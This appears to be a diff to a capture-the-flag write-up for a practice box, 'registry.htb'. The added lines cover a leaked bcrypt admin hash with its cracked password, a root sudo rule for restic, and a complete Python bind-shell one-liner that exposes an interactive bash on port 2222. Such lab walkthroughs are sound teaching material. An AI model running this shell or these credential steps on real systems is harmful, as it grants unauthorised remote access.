@@ -1,3 +1,5 @@
+![](./logo.png)
+
 Running some enumeration on the box gives us port `22`, `80` and `443` open and running. 
 
 The first interesting thing to notice is the `commonName` in the self-signed SSL certificate: `docker.registry.htb`. Commonly boxes will have dynamic host redirection. 
@@ -52,7 +54,7 @@ Looking around shows us `.ssh` keys in the the `/root` directory. They are for t
 
 Looking in the user directory shows us a `.vimprofile` file. This contains reference to a file `/etc/profile.d/01-ssh.sh`. This file contains:
 
-```
+```bash
 #!/usr/bin/expect -f
 #eval `ssh-agent -s`
 spawn ssh-add /root/.ssh/id_rsa
@@ -78,7 +80,22 @@ This lets us log on and grab the `user.txt`!
 ?>
 ```
 
-
+```
 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
+```
 
+Cracking it gives us
+
+```
 admin:strawberry
+```
+
+```
+User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest* ---
+```
+
+We can obtain a shell by using a python bind shell:
+
+```
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
+```
